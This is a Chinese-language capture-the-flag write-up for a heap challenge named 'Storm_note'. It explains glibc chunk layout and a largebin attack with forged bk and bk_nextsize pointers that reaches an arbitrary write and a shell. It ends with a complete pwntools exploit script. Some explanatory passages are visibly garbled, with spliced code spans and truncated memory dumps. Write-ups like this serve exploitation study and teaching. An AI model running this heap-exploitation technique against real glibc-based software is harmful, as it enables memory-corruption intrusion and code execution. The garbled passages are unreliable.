对于堆块的结构：
    struct malloc_chunk {
      INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
      INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */
      struct malloc_chunk* fd;         /* double links -- used only if free. */
      struct malloc_chunk* bk;
      /* Only used for large blocks: pointer to next larger size.  */
      struct malloc_chunk* fd_nextsize; 
      struct malloc_chunk* bk_nextsize;
  * fd_nextsize、bk_nextsize 只有当 chunk 空闲的时候才使用，且只适用于 large chunk，因此后面如果要触发 unlink 的话，我们除了要伪造 bk 指针，还需要伪造 bk_nextsize 指针。
### 将 unsorted bin 的块放入 largebin 中
前两步我们将 alloc 了大小为 0x4e0 的 chunk2，所以他现在出于使用状态，接下来就要将他重新 free 掉。
    dele(2)
    add(0x4e8)      // put chunk4  into largebin
    dele(2)
一步步来看，首先第一次 free 时，发现 chunk5 已经是处在 unsorted bin 中的空闲状态，所以当 free(2) 时，就将双链表把
chunk2 和 chunk5 连接起来放入 unsorted bin 中。
第二步，重新 alloc 一个 0x4e8 的 chunk 时，根据 unsorted bin 的 FIFO 的特点，会检查 chunk5
的大小是否满足我们的需要，因为 `size=(0x4e1-0x11=0x4f0)bk_nextsize->fd_nextsize=victim
    fwd->bk=victim
    在这里等价于：
    chunk5->bk_nextsize->fd_nextsize = chunk2
    chunk5->bk = chunk2
那对于还没有分配之前来说，堆排布如下：
    chunk2：
    0x55e2396f2060: 0x0000000000000000  0x00000000000004f1
    0x55e2396f2070: 0x0000000000000000  0x00000000abcd00e0  fd_nextsize = 0x55e2396f2060 即 
    *0xabcd00e3 = 0x55e2396f2060 
    2. 0x55e2396f25c0->fd = 0x55e2396f2060 即 
    *0x55e2396f25d8 = 0x55e2396f2060
验证一下，情况确实和我们预想的一样。
所以这里在完成 unlink 操作后，这个 chunk 最后我们会分配到 0xabcd00f0 地址。
  * largebin 中的 bk_nextsize 需要伪造成 `p64(fake_chunk-0x18-5)` 的原因类似于 fastbin 的检查机制。 **alloc 时的堆块会检查这个位置的 size 字段是否和当前的 malloc 的 size 满足对齐规则** 。
这里伪造的 size 为 0x56，因为受到 PIE 的影响这个值会有偏差，所以这里 alloc 失败的话可以多试几次。
此时的 chunk2 从 `0xabcd00f0` 开始填充，后面的 0x40 的大小区域都可控， **所以这里只需要预先填入准备好的值，后面输入 666
就可以进入到后门函数** ，再次填入这个值即可通过判断，进而 getshell。
    payload = p64(0) * 2+p64(0) * 6
    edit(2,payload)
    p.sendlineafter('Choice: ','666')
    p.send(p64(0)*6)
## exp
    from pwn import *
    p = process('./Storm_note')
    def add(size):
      p.recvuntil('Choice')
      p.sendline('1')
      p.recvuntil('?')
      p.sendline(str(size))
    def edit(idx,mes):
      p.recvuntil('Choice')
      p.sendline('2')
      p.recvuntil('?')
      p.sendline(str(idx))
      p.recvuntil('Content')
      p.send(mes)
    def dele(idx):
      p.recvuntil('Choice')
      p.sendline('3')
      p.recvuntil('?')
      p.sendline(str(idx))
    add(0x18)
    add(0x508)
    add(0x18)
    add(0x18)
    add(0x508)
    add(0x18)
    add(0x18)
    edit(1,'a'*0x4f0+p64(0x500))
    edit(4,'a'*0x4f0+p64(0x500))
    dele(1)
    edit(0,'a'*0x18)
    add(0x18)
    add(0x4d8)
    dele(1)
    dele(2)
    add(0x30)
    edit(7,'ffff')
    add(0x4e0)
    dele(4)
    edit(3,'a'*0x18)
    add(0x18)
    add(0x4d8)
    dele(4)
    dele(5)
    add(0x40)
    edit(8,'ffff')
    dele(2)
    add(0x4e8)      # put chunk5 to largebin
    dele(2)
    content_addr = 0xabcd0100
    fake_chunk = content_addr - 0x20
    payload = p64(0)*2 + p64(0) + p64(0x4f1) # size
    payload += p64(0) + p64(fake_chunk)      # bk
    edit(7,payload)
    payload2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
    payload2 += p64(0) + p64(fake_chunk+8)   
    payload2 += p64(0) + p64(fake_chunk-0x18-5)
    edit(8,payload2)
    add(0x40)
    payload = p64(0) * 2+p64(0) * 6
    edit(2,payload)
    p.sendlineafter('Choice: ','666')
    p.send(p64(0)*6)
    p.interactive()
## 总结
这题的难点在于构造 largebin 以及如何使用 largebin attack 来达到任意地址写的目的。若这题不存在 PIE 的话直接使用 unlink
就可以很快解出，所以这题的思想也在于对于 PIE 保护的处理。
## 参考资料
[https://mp.weixin.qq.com/s/rlSyABoulRKygPmwfcUuXA?client=tim&ADUIN=1179317825&ADSESSION=1554624433&ADTAG=CLIENT.QQ.5603_.0&ADPUBNO=26882](https://mp.weixin.qq.com/s/rlSyABoulRKygPmwfcUuXA?client=tim&ADUIN=1179317825&ADSESSION=1554624433&ADTAG=CLIENT.QQ.5603_.0&ADPUBNO=26882)